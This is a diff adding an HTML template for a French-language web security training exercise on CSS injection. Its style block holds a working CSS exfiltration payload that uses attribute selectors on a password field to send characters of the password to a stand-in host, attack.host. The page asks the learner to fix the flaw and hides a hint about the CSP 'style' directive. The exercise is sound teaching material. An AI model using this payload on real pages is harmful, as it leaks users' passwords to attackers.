@@ -1,0 +1,90 @@
+{% extends "layout/default.html" %}
+{% block title %}CSS Injection{% endblock %}
+{% block head %}
+{{ super() }}
+<style>
+  #password[value*="a"]~#a {
+    background: url("https://attack.host/a");
+  }
+
+  #password[value*="b"]~#b {
+    background: url("https://attack.host/b");
+  }
+
+  #password[value*="c"]~#c {
+    background: url("https://attack.host/c");
+  }
+
+  #password[value*="d"]~#d {
+    background: url("https://attack.host/d");
+  }
+
+  #password[value*="e"]~#e {
+    background: url("https://attack.host/e");
+  }
+
+  #password[value*="f"]~#f {
+    background: url("https://attack.host/f");
+  }
+
+  #password[value*="g"]~#g {
+    background: url("https://attack.host/g");
+  }
+
+  #password[value*="h"]~#h {
+    background: url("https://attack.host/h");
+  }
+
+  #password[value*="s"]~#s {
+    background: url("https://attack.host/s");
+  }
+
+  #password[value*="r"]~#r {
+    background: url("https://attack.host/r");
+  }
+
+  #password[value*="t"]~#t {
+    background: url("https://attack.host/t");
+  }
+</style>
+{% endblock %}
+{% block content %}
+<p>
+  Un attaquant a de nouveau réussi à inclure son code dans votre page.
+  Cette fois-ci, il réussi à lire les valeurs pré-chargées dans un champ.
+</p>
+<p>
+  Corrigez le problème en modifiant la méthode css-injection dans le fichier unsecure.py
+</p>
+<form>
+  Password: <input type="password" id="password" name="password" value="secret" />
+  <input id="form_submit" type="submit" value="submit" />
+  <a id="s"></a>
+  <a id="e"></a>
+  <a id="c"></a>
+  <a id="r"></a>
+  <a id="t"></a>
+</form>
+<p>
+  Ressources:
+  <ul>
+    <li><a href="https://developer.mozilla.org/fr/docs/Web/CSS/Attribute_selectors">MDN Attribute_selectors</a></li>
+  </ul>
+</p>
+<div class="accordion" id="accordionExample">
+  <div class="accordion-item">
+    <h2 class="accordion-header" id="headingOne">
+      <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapseOne"
+        aria-expanded="true" aria-controls="collapseOne">
+        Solution
+      </button>
+    </h2>
+    <div id="collapseOne" class="accordion-collapse collapse" aria-labelledby="headingOne"
+      data-bs-parent="#accordionExample">
+      <div class="accordion-body">
+        Le paramètre de CSP à utiliser est <strong>style</strong>.
+      </div>
+    </div>
+  </div>
+</div>
+{% endblock %}
